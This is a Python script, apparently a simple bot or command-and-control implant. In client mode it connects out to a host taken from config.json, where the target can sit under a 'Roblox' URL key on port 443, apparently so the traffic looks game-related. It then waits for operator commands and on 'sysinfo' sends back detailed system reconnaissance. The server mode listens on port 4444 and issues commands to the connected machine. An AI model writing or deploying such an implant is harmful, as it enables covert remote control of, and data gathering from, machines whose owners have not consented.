#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from socket import socket
import platform
import psutil
import time
import locale
import main
import json
import select
import logging
import os

# Configurar logging
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
logging.basicConfig(
    filename=os.path.join(log_dir, 'bot.log'),
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)

def get_system_info():
    info = {}
    platform_info = {
        'hostname': platform.node(),
        'os': platform.system(),
        'os_release': platform.release(),
        'os_version': platform.version(),
        'machine': platform.machine(),
        'os_build_type': platform.architecture()[0],
        'system_boot_time': psutil.boot_time(),
        'system_manufacturer': platform.system(),
        'processor': platform.processor(),
    }
    info['platform'] = platform_info

    cpu_info = {
        'cpu_percent': psutil.cpu_percent(),
        'cpu_count': psutil.cpu_count(),
        'cpu_freq': psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None,
        'cpu_times': psutil.cpu_times()._asdict(),
    }
    info['cpu'] = cpu_info

    mem = psutil.virtual_memory()
    memory_info = {
        'total': mem.total,
        'available': mem.available,
        'used': mem.used,
        'free': mem.free,
        'active': getattr(mem, 'active', None),
        'inactive': getattr(mem, 'inactive', None),
        'buffers': getattr(mem, 'buffers', None),
        'cached': getattr(mem, 'cached', None),
        'shared': getattr(mem, 'shared', None),
        'slab': getattr(mem, 'slab', None),
    }
    info['memory'] = memory_info

    disk = psutil.disk_usage('/')
    disk_info = {
        'total': disk.total,
        'used': disk.used,
        'free': disk.free,
        'percent': disk.percent,
    }
    info['disk'] = disk_info

    net = psutil.net_io_counters()
    network_info = {
        'bytes_sent': net.bytes_sent,
        'bytes_recv': net.bytes_recv,
        'packets_sent': net.packets_sent,
        'packets_recv': net.packets_recv,
        'errin': net.errin,
        'errout': net.errout,
        'dropin': net.dropin,
        'dropout': net.dropout,
    }
    info['network'] = network_info

    locale_info = {
        'preferred_encoding': locale.getpreferredencoding(),
        'timezones': time.tzname,
    }
    info['locale'] = locale_info

    return json.dumps(info, indent=2)

def safe_send(sock, data):
    if isinstance(data, str):
        data = data.encode()
    total_sent = 0
    while total_sent < len(data):
        try:
            ready = select.select([], [sock], [], 5)
            if ready[1]:
                sent = sock.send(data[total_sent:total_sent+4096])
                if sent == 0:
                    raise BrokenPipeError("Socket connection broken")
                total_sent += sent
            else:
                raise TimeoutError("Socket not ready for sending")
        except (BrokenPipeError, ConnectionResetError, TimeoutError) as e:
            logging.error(f"Erro ao enviar dados: {e}")
            break

def start_client(host, port):
    client = socket()
    try:
        client.connect((host, port))
        logging.info(f"Cliente conectado a {host}:{port}")
        print(f"[+] Conectado a {host}:{port}")

        while True:
            try:
                command = client.recv(1024).decode().strip()
            except ConnectionResetError:
                break

            if not command:
                break

            print(f"[>] Comando recebido: {command}")
            logging.info(f"Comando recebido: {command}")

            try:
                if command == "exit":
                    safe_send(client, "Desconectando...")
                    break
                elif command == "sysinfo":
                    safe_send(client, get_system_info())
                else:
                    safe_send(client, f"Comando desconhecido: {command}")

                safe_send(client, "OK")
            except Exception as e:
                logging.error(f"Falha ao enviar dados: {e}")
                break

    except Exception as e:
        logging.error(f"Erro no cliente: {e}")
        print(f"[!] Erro: {e}")
    finally:
        client.close()
        logging.info("Cliente finalizado com sucesso.")
        print("[*] Cliente finalizado com sucesso.")

def start_server(host='0.0.0.0', port=4444):
    server = socket()
    server.bind((host, port))
    server.listen(1)
    logging.info(f"Servidor escutando em {host}:{port}")
    print(f"[+] Servidor escutando em {host}:{port}")

    conn, addr = server.accept()
    logging.info(f"Cliente conectado: {addr}")
    print(f"[+] Cliente conectado: {addr}")

    try:
        while True:
            command = input("[>] Comando para enviar ('sysinfo', 'exit'): ").strip()
            if not command:
                continue

            logging.info(f"Enviando comando: {command}")
            safe_send(conn, command)

            if command == "exit":
                print("[*] Encerrando conexão com o cliente.")
                break

            data = conn.recv(4096).decode()
            print("[<] Resposta recebida:\n", data)
            logging.info(f"Resposta recebida: {data}")

            try:
                ok = conn.recv(1024).decode()
                print("[*] Confirmação do cliente:", ok)
                logging.info(f"Confirmação do cliente: {ok}")
            except:
                logging.warning("Nenhuma confirmação recebida do cliente.")
                pass

    except KeyboardInterrupt:
        logging.warning("Servidor interrompido manualmente.")
        print("\n[!] Interrompido manualmente.")
    finally:
        conn.close()
        server.close()
        logging.info("Servidor finalizado com sucesso.")
        print("[*] Servidor finalizado com sucesso.")

def main():
    import sys
    try:
        mode = sys.argv[1]
    except IndexError:
        mode = "client"

    if mode == "server":
        start_server()
    else:
        try:
            with open('config.json', 'r') as f:
                config = json.load(f)

            host = config.get('host') or config.get('Roblox', {}).get('URL', '127.0.0.1').replace("https://", "").replace("http://", "")
            port = config.get('port') or int(config.get('Roblox', {}).get('Port', 443))

            print(f"[*] Usando host: {host}, porta: {port}")
            logging.info(f"Iniciando cliente para {host}:{port}")
            start_client(host, port)

        except FileNotFoundError:
            logging.error("Arquivo 'config.json' não encontrado!")
            print("[!] Arquivo 'config.json' não encontrado!")
        except json.JSONDecodeError:
            logging.error("Erro ao ler o arquivo de configuração.")
            print("[!] Erro ao ler o arquivo de configuração.")
        except Exception as e:
            logging.error(f"Erro inesperado: {e}")
            print(f"[!] Erro inesperado: {e}")

if __name__ == '__main__':
    main()
